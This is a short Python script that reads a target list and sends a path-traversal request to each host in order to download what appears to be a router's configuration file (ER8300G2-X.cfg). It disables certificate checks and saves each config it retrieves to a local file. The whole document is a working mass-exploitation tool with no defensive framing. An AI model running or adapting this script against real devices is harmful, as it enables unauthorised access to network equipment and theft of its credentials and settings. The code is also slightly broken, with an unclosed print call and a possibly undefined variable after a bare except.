```
import requests
import urllib3
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
payload = '/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg'
invalidkey = "home.asp"
with open('target.txt', 'r') as f:
    for target in f:
        url = target + payload
        # print('target:',url)
        try:
            req = requests.get(url, verify=False)
        except:
            pass
        if req.status_code == 200:
            if invalidkey not in req.text:
                parsed = urlparse(url)
                with open(str(parsed.hostname) + '.' + str(parsed.port) + '.txt', 'w') as w:
                    w.write(req.text)
                    w.close()
                    print('[+] Target: ' + target + ' is Vulnerability'
```

